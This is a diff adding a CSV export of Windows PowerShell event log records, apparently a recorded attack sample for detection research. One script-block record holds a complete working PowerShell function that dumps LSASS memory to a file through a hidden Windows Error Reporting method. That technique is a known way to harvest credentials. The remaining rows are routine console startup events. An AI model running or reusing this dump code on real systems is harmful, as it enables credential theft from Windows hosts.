@@ -1,0 +1,59 @@
+"Message","Id","Version","Qualifiers","Level","Task","Opcode","Keywords","RecordId","ProviderName","ProviderId","LogName","ProcessId","ThreadId","MachineName","UserId","TimeCreated","ActivityId","RelatedActivityId","MatchedQueryIds","Bookmark","LevelDisplayName","OpcodeDisplayName","TaskDisplayName","KeywordsDisplayNames","Properties"
+"Creating Scriptblock text (1 of 1):
+function Memory($path)
+{
+			  
+			  
+		$Process = Get-Process lsass
+		$DumpFilePath = $path
+		
+		$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
+		$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
+		$Flags = [Reflection.BindingFlags] 'NonPublic, Static'
+		$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
+		$MiniDumpWithFullMemory = [UInt32] 2
+	
+			
+			  #
+		$ProcessId = $Process.Id
+		$ProcessName = $Process.Name
+		$ProcessHandle = $Process.Handle
+		$ProcessFileName = ""$($ProcessName).dmp""
+		
+		$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName
+		
+		$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
+			  
+		$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
+													$ProcessId,
+													$FileStream.SafeFileHandle,
+													$MiniDumpWithFullMemory,
+													[IntPtr]::Zero,
+													[IntPtr]::Zero,
+													[IntPtr]::Zero))
+			  
+		$FileStream.Close()
+		
+		if (-not $Result)
+		{
+			$Exception = New-Object ComponentModel.Win32Exception
+			$ExceptionMessage = ""$($Exception.Message) ($($ProcessName):$($ProcessId))""
+			
+			# Remove any partially written dump files. For example, a partial dump will be written
+			# in the case when 32-bit PowerShell tries to dump a 64-bit process.
+			Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue
+			
+			throw $ExceptionMessage
+		}
+		else
+		{
+			""Memdump complete!""
+		}
+	
+}
+
+ScriptBlock ID: 27f08bda-c330-419f-b83b-eb5c0f699930
+Path: C:\Users\Public\lsass_wer_ps.ps1","4104","1",,"3","2","15","0","971","Microsoft-Windows-PowerShell","a0c1853b-5c40-4b15-8766-3cf1c58f985a","Microsoft-Windows-PowerShell/Operational","7008","6488","MSEDGEWIN10","S-1-5-21-3461203602-4096304019-2269080069-1000","6/30/2020 7:24:08 AM","4aa5eae3-4f33-0001-3a2b-a64a334fd601",,"System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Warning","On create calls","Execute a Remote Command","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
+"PowerShell console is ready for user input","40962","1",,"4","4","2","0","970","Microsoft-Windows-PowerShell","a0c1853b-5c40-4b15-8766-3cf1c58f985a","Microsoft-Windows-PowerShell/Operational","7008","5532","MSEDGEWIN10","S-1-5-21-3461203602-4096304019-2269080069-1000","6/30/2020 7:23:58 AM","4aa5eae3-4f33-0000-501d-a64a334fd601",,"System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Stop","PowerShell Console Startup","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
+"Windows PowerShell has started an IPC listening thread on process: 7008 in AppDomain: DefaultAppDomain.","53504","1",,"4","111","10","0","969","Microsoft-Windows-PowerShell","a0c1853b-5c40-4b15-8766-3cf1c58f985a","Microsoft-Windows-PowerShell/Operational","7008","1916","MSEDGEWIN10","S-1-5-21-3461203602-4096304019-2269080069-1000","6/30/2020 7:23:58 AM","4aa5eae3-4f33-0000-501d-a64a334fd601",,"System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Open (async)","PowerShell Named Pipe IPC","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
+"PowerShell console is starting up","40961","1",,"4","4","1","0","968","Microsoft-Windows-PowerShell","a0c1853b-5c40-4b15-8766-3cf1c58f985a","Microsoft-Windows-PowerShell/Operational","7008","5532","MSEDGEWIN10","S-1-5-21-3461203602-4096304019-2269080069-1000","6/30/2020 7:23:58 AM","4aa5eae3-4f33-0000-501d-a64a334fd601",,"System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Start","PowerShell Console Startup","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
